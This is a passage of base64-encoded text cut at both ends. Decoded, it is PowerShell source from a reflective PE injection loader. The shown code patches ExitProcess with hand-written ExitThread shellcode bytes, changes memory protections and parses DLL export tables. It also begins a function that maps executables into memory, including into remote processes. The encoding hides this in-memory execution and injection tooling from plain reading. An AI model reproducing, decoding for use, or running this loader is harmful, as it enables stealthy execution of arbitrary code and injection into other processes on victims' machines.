AkZmFsc2UpCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRXQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkT2xkUHJvdGVjdEZsYWcpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAoJCQl9CgkJfQoJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkKCQkKCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJI05leHQgb3ZlcndyaXRlIENvckV4aXRQcm9jZXNzIGFuZCBFeGl0UHJvY2VzcyB0byBpbnN0ZWFkIEV4aXRUaHJlYWQuIFRoaXMgd2F5IHRoZSBlbnRpcmUgUG93ZXJzaGVsbCBwcm9jZXNzIGRvZXNuJ3QgZGllIHdoZW4gdGhlIEVYRSBleGl0cy4KCgkJJFJldHVybkFycmF5ID0gQCgpCgkJJEV4aXRGdW5jdGlvbnMgPSBAKCkgI0FycmF5IG9mIGZ1bmN0aW9ucyB0byBvdmVyd3JpdGUgc28gdGhlIHRocmVhZCBkb2Vzbid0IGV4aXQgdGhlIHByb2Nlc3MKCQkKCQkjQ29yRXhpdFByb2Nlc3MgKGNvbXBpbGVkIGluIHRvIHZpc3VhbCBzdHVkaW8gYysrKQoJCVtJbnRQdHJdJE1zY29yZWVIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgibXNjb3JlZS5kbGwiKQoJCWlmICgkTXNjb3JlZUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQl0aHJvdyAibXNjb3JlZSBoYW5kbGUgbnVsbCIKCQl9CgkJW0ludFB0cl0kQ29yRXhpdFByb2Nlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkTXNjb3JlZUhhbmRsZSwgIkNvckV4aXRQcm9jZXNzIikKCQlpZiAoJENvckV4aXRQcm9jZXNzQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQlUaHJvdyAiQ29yRXhpdFByb2Nlc3MgYWRkcmVzcyBub3QgZm91bmQiCgkJfQoJCSRFeGl0RnVuY3Rpb25zICs9ICRDb3JFeGl0UHJvY2Vzc0FkZHIKCQkKCQkjRXhpdFByb2Nlc3MgKHdoYXQgbm9uLW1hbmFnZWQgcHJvZ3JhbXMgdXNlKQoJCVtJbnRQdHJdJEV4aXRQcm9jZXNzQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiRXhpdFByb2Nlc3MiKQoJCWlmICgkRXhpdFByb2Nlc3NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJFeGl0UHJvY2VzcyBhZGRyZXNzIG5vdCBmb3VuZCIKCQl9CgkJJEV4aXRGdW5jdGlvbnMgKz0gJEV4aXRQcm9jZXNzQWRkcgoJCQoJCVtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAoJCWZvcmVhY2ggKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciBpbiAkRXhpdEZ1bmN0aW9ucykKCQl7CgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9ICRQcm9jRXhpdEZ1bmN0aW9uQWRkcgoJCQkjVGhlIGZvbGxvd2luZyBpcyB0aGUgc2hlbGxjb2RlIChTaGVsbGNvZGU6IEV4aXRUaHJlYWQuYXNtKToKCQkJIzMyYml0IHNoZWxsY29kZQoJCQlbQnl0ZVtdXSRTaGVsbGNvZGUxID0gQCgweGJiKQoJCQlbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGM2LCAweDAzLCAweDAxLCAweDgzLCAweGVjLCAweDIwLCAweDgzLCAweGU0LCAweGMwLCAweGJiKQoJCQkjNjRiaXQgc2hlbGxjb2RlIChTaGVsbGNvZGU6IEV4aXRUaHJlYWQuYXNtKQoJCQlpZiAoJFB0clNpemUgLWVxIDgpCgkJCXsKCQkJCVtCeXRlW11dJFNoZWxsY29kZTEgPSBAKDB4NDgsIDB4YmIpCgkJCQlbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGM2LCAweDAzLCAweDAxLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGJiKQoJCQl9CgkJCVtCeXRlW11dJFNoZWxsY29kZTMgPSBAKDB4ZmYsIDB4ZDMpCgkJCSRUb3RhbFNpemUgPSAkU2hlbGxjb2RlMS5MZW5ndGggKyAkUHRyU2l6ZSArICRTaGVsbGNvZGUyLkxlbmd0aCArICRQdHJTaXplICsgJFNoZWxsY29kZTMuTGVuZ3RoCgkJCQoJCQlbSW50UHRyXSRFeGl0VGhyZWFkQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiRXhpdFRocmVhZCIpCgkJCWlmICgkRXhpdFRocmVhZEFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiRXhpdFRocmVhZCBhZGRyZXNzIG5vdCBmb3VuZCIKCQkJfQoKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJfQoJCQkKCQkJI01ha2UgY29weSBvZiBvcmlnaW5hbCBFeGl0UHJvY2VzcyBieXRlcwoJCQkkRXhpdFByb2Nlc3NPcmlnQnl0ZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRvdGFsU2l6ZSkKCQkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEV4aXRQcm9jZXNzT3JpZ0J5dGVzUHRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHIsIFtVSW50NjRdJFRvdGFsU2l6ZSkgfCBPdXQtTnVsbAoJCQkkUmV0dXJuQXJyYXkgKz0gLCgkUHJvY0V4aXRGdW5jdGlvbkFkZHIsICRFeGl0UHJvY2Vzc09yaWdCeXRlc1B0ciwgJFRvdGFsU2l6ZSkKCQkJCgkJCSNXcml0ZSB0aGUgRXhpdFRocmVhZCBzaGVsbGNvZGUgdG8gbWVtb3J5LiBUaGlzIHNoZWxsY29kZSB3aWxsIHdyaXRlIDB4MDEgdG8gRXhlRG9uZUJ5dGVQdHIgYWRkcmVzcyAoc28gUFMga25vd3MgdGhlIEVYRSBpcyBkb25lKSwgdGhlbiAKCQkJIwljYWxsIEV4aXRUaHJlYWQKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhlRG9uZUJ5dGVQdHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQoJCQkkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgkJCSRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTIuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhpdFRocmVhZEFkZHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQoJCQkkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTMgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQl9CgkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCQlXcml0ZS1PdXRwdXQgJFJldHVybkFycmF5Cgl9CgkKCQoJI1RoaXMgZnVuY3Rpb24gdGFrZXMgYW4gYXJyYXkgb2YgYXJyYXlzLCB0aGUgaW5uZXIgYXJyYXkgb2YgZm9ybWF0IEAoJERlc3RBZGRyLCAkU291cmNlQWRkciwgJENvdW50KQoJIwlJdCBjb3BpZXMgQ291bnQgYnl0ZXMgZnJvbSBTb3VyY2UgdG8gRGVzdGluYXRpb24uCglGdW5jdGlvbiBDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtBcnJheVtdXQoJCSRDb3B5SW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cwoJCSkKCgkJW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCgkJZm9yZWFjaCAoJEluZm8gaW4gJENvcHlJbmZvKQoJCXsKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJfQoJCQkKCQkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEluZm9bMF0sICRJbmZvWzFdLCBbVUludDY0XSRJbmZvWzJdKSB8IE91dC1OdWxsCgkJCQoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQl9Cgl9CgoKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCSMjIyMjIyMjIyMgICAgRlVOQ1RJT05TICAgIyMjIyMjIyMjIyMKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCUZ1bmN0aW9uIEdldC1NZW1vcnlQcm9jQWRkcmVzcwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkUEVIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRGdW5jdGlvbk5hbWUKCQkpCgkJCgkJJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwoJCSRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwoJCSRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJCgkJI0dldCB0aGUgZXhwb3J0IHRhYmxlCgkJaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5FeHBvcnRUYWJsZS5TaXplIC1lcSAwKQoJCXsKCQkJcmV0dXJuIFtJbnRQdHJdOjpaZXJvCgkJfQoJCSRFeHBvcnRUYWJsZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRXhwb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCgkJJEV4cG9ydFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEV4cG9ydFRhYmxlUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9FWFBPUlRfRElSRUNUT1JZKQoJCQoJCWZvciAoJGkgPSAwOyAkaSAtbHQgJEV4cG9ydFRhYmxlLk51bWJlck9mTmFtZXM7ICRpKyspCgkJewoJCQkjQWRkcmVzc09mTmFtZXMgaXMgYW4gYXJyYXkgb2YgcG9pbnRlcnMgdG8gc3RyaW5ncyBvZiB0aGUgbmFtZXMgb2YgdGhlIGZ1bmN0aW9ucyBleHBvcnRlZAoJCQkkTmFtZU9mZnNldFB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkRXhwb3J0VGFibGUuQWRkcmVzc09mTmFtZXMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQzMl0pKSkKCQkJJE5hbWVQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE5hbWVPZmZzZXRQdHIsIFtUeXBlXVtVSW50MzJdKSkKCQkJJE5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE5hbWVQdHIpCgoJCQlpZiAoJE5hbWUgLWNlcSAkRnVuY3Rpb25OYW1lKQoJCQl7CgkJCQkjQWRkcmVzc09mTmFtZU9yZGluYWxzIGlzIGEgdGFibGUgd2hpY2ggY29udGFpbnMgcG9pbnRzIHRvIGEgV09SRCB3aGljaCBpcyB0aGUgaW5kZXggaW4gdG8gQWRkcmVzc09mRnVuY3Rpb25zCgkJCQkjICAgIHdoaWNoIGNvbnRhaW5zIHRoZSBvZmZzZXQgb2YgdGhlIGZ1bmN0aW9uIGluIHRvIHRoZSBETEwKCQkJCSRPcmRpbmFsUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lT3JkaW5hbHMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKSkKCQkJCSRGdW5jSW5kZXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JkaW5hbFB0ciwgW1R5cGVdW1VJbnQxNl0pCgkJCQkkRnVuY09mZnNldEFkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZkZ1bmN0aW9ucyArICgkRnVuY0luZGV4ICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtVSW50MzJdKSkpCgkJCQkkRnVuY09mZnNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRGdW5jT2Zmc2V0QWRkciwgW1R5cGVdW1VJbnQzMl0pCgkJCQlyZXR1cm4gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRGdW5jT2Zmc2V0KQoJCQl9CgkJfQoJCQoJCXJldHVybiBbSW50UHRyXTo6WmVybwoJfQoKCglGdW5jdGlvbiBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlICldCgkJW0J5dGVbXV0KCQkkUEVCeXRlcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KCQlbU3RyaW5nXQoJCSRFeGVBcmdzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZVByb2NIYW5kbGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSID0gJGZhbHNlCgkJKQoJCQoJCSRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQoJCQoJCSNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKCQkkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKCQkkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKCQkkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCgkJCgkJJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKCQlpZiAoKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSAkbnVsbCkgLWFuZCAoJFJlbW90ZVByb2NIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKSkKCQl7CgkJCSRSZW1vdGVMb2FkaW5nID0gJHRydWUKCQl9CgkJCgkJI0dldCBiYXNpYyBQRSBpbmZvcm1hdGlvbgoJCVdyaXRlLVZlcmJvc2UgIkdldHRpbmcgYmFzaWMgUEUgaW5mb3JtYXRpb24gZnJvbSB0aGUgZmlsZSIKCQkkUEVJbmZvID0gR2V0LVBFQmFzaWNJbmZvIC1QRUJ5dGVzICRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgkJJE9yaWdpbmFsSW1hZ2VCYXNlID0gJFBFSW5mby5PcmlnaW5hbEltYWdlQmFzZQoJCSROWENvbXBhdGlibGUgPSAkdHJ1ZQoJCWlmICgoJFBFSW5mby5EbGxDaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OWF9DT01QQVQpIC1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCkKCQl7CgkJCVdyaXRlLVdhcm5pbmcgIlBFIGlzIG5vdCBjb21wYXRpYmxlIHdpdGggREVQLCBtaWdodCBjYXVzZSBpc3N1ZXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCgkJCSROWENvbXBhdGlibGUgPSAkZmFsc2UKCQl9CgkJCgkJCgkJI1ZlcmlmeSB0aGF0IHRoZSBQRSBhbmQgdGhlIGN1cnJlbnQgcHJvY2VzcyBhcmUgdGhlIHNhbWUgYml0cyAoMzJiaXQgb3IgNjRiaXQpCgkJJFByb2Nlc3M2NEJpdCA9ICR0cnVlCgkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKCQl7CgkJCSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQoJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJJc1dvdzY0UHJvY2VzcyIpCgkJCWlmICgkUmVzdWx0IC1lcSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJVGhyb3cgIkNvdWxkbid0IGxvY2F0ZSBJc1dvdzY0UHJvY2VzcyBmdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgdGFyZ2V0IHByb2Nlc3MgaXMgMzJiaXQgb3IgNjRiaXQiCgkJCX0KCQkJCgkJCVtCb29sXSRXb3c2NFByb2Nlc3MgPSAkZmFsc2UKCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbUmVmXSRXb3c2NFByb2Nlc3MpCgkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCQl7CgkJCQlUaHJvdyAiQ2FsbCB0byBJc1dvdzY0UHJvY2VzcyBmYWlsZWQiCgkJCX0KCQkJCgkJCWlmICgoJFdvdzY0UHJvY2VzcyAtZXEgJHRydWUpIC1vciAoKCRXb3c2NFByb2Nlc3MgLWVxICRmYWxzZSkgLWFuZCAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCkpKQoJCQl7CgkJCQkkUHJvY2VzczY0Qml0ID0gJGZhbHNlCgkJCX0KCQkJCgkJCSNQb3dlclNoZWxsIG5lZWRzIHRvIGJlIHNhbWUgYml0IGFzIHRoZSBQRSBiZWluZyBsb2FkZWQgZm9yIEludFB0ciB0byB3b3JrIGNvcnJlY3RseQoJCQkkUG93ZXJTaGVsbDY0Qml0ID0gJHRydWUKCQkJaWYgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLW5lIDgpCgkJCXsKCQkJCSRQb3dlclNoZWxsNjRCaXQgPSAkZmFsc2UKCQkJfQoJCQlpZiAoJFBvd2VyU2hlbGw2NEJpdCAtbmUgJFByb2Nlc3M2NEJpdCkKCQkJewoJCQkJdGhyb3cgIlBvd2VyU2hlbGwgbXVzdCBiZSBzYW1lIGFyY2hpdGVjdHVyZSAoeDg2L3g2NCkgYXMgUEUgYmVpbmcgbG9hZGVkIGFuZCByZW1vdGUgcHJvY2VzcyIKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkKCQkJewoJCQkJJFByb2Nlc3M2NEJpdCA9ICRmYWxzZQoJCQl9CgkJfQoJCWlmICgkUHJvY2VzczY0Qml0IC1uZSAkUEVJbmZvLlBFNjRCaXQpCgkJewoJCQlUaHJvdyAiUEUgcGxhdGZvcm0gZG9lc24ndCBtYXRjaCB0aGUgYXJjaGl0ZWN0dXJlIG9mIHRoZSBwcm9jZXNzIGl0IGlzIGJlaW5nIGxvYWRlZCBpbiAoMzIvNjRiaXQpIgoJCX0KCQkKCgkJI0FsbG9jYXRlIG1lbW9yeSBhbmQgd3JpdGUgdGhlIFBFIHRvIG1lbW9yeS4gSWYgdGhlIFBFIHN1cHBvcnRzIEFTTFIsIGFsbG9jYXRlIHRvIGEgcmFuZG9tIG1lbW9yeSBhZGRyZXNzCgkJV3JpdGUtVmVyYm9zZSAiQWxsb2NhdGluZyBtZW1vcnkgZm9yIHRoZSBQRSBhbmQgd3JpdGUgaXRzIGhlYWRlcnMgdG8gbWVtb3J5IgoJCQogICAgICAgICNBU0xSIGNoZWNrCgkJW0ludFB0cl0kTG9hZEFkZHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRQRVN1cHBvcnRzQVNMUiA9ICgkUEVJbmZvLkRsbENoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRSkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFCgkJaWYgKCgtbm90ICRGb3JjZUFTTFIpIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKCQl7CgkJCVdyaXRlLVdhcm5pbmcgIlBFIGZpbGUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgQVNMUiBjb21wYXRpYmxlLiBJZiB0aGUgbG9hZGluZyBmYWlscywgdHJ5IHJlc3RhcnRpbmcgUG93ZXJTaGVsbCBhbmQgdHJ5aW5nIGFnYWluIE9SIHRyeSB1c2luZyB0aGUgLUZvcmNlQVNMUiBmbGFnIChjb3VsZCBjYXVzZSBjcmFzaGVzKSIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKCQkJW0ludFB0cl0kTG9hZEFkZHIgPSAkT3JpZ2luYWxJbWFnZUJhc2UKCQl9CiAgICAgICAgZWxzZWlmICgkRm9yY2VBU0xSIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGZpbGUgZG9lc24ndCBzdXBwb3J0IEFTTFIgYnV0IC1Gb3JjZUFTTFIgaXMgc2V0LiBGb3JjaW5nIEFTTFIgb24gdGhlIFBFIGZpbGUuIFRoaXMgY291bGQgcmVzdWx0IGluIGEgY3Jhc2guIgogICAgICAgIH0KCiAgICAgICAgaWYgKCRGb3JjZUFTTFIgLWFuZCAkUmVtb3RlTG9hZGluZykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJDYW5ub3QgdXNlIEZvcmNlQVNMUiB3aGVuIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4iIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtYW5kICgtbm90ICRQRVN1cHBvcnRzQVNMUikpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiUEUgZG9lc24ndCBzdXBwb3J0IEFTTFIuIENhbm5vdCBsb2FkIGEgbm9uLUFTTFIgUEUgaW4gdG8gYSByZW1vdGUgcHJvY2VzcyIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CgoJCSRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCQkJCSNUaGlzIGlzIHdoZXJlIHRoZSBQRSBpcyBhbGxvY2F0ZWQgaW4gUG93ZXJTaGVsbAoJCSRFZmZlY3RpdmVQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCQkjVGhpcyBpcyB0aGUgYWRkcmVzcyB0aGUgUEUgd2lsbCBiZSBsb2FkZWQgdG8uIElmIGl0IGlzIGxvYWRlZCBpbiBQb3dlclNoZWxsLCB0aGlzIGVxdWFscyAkUEVIYW5kbGUuIElmIGl0IGlzIGxvYWRlZCBpbiBhIHJlbW90ZSBwc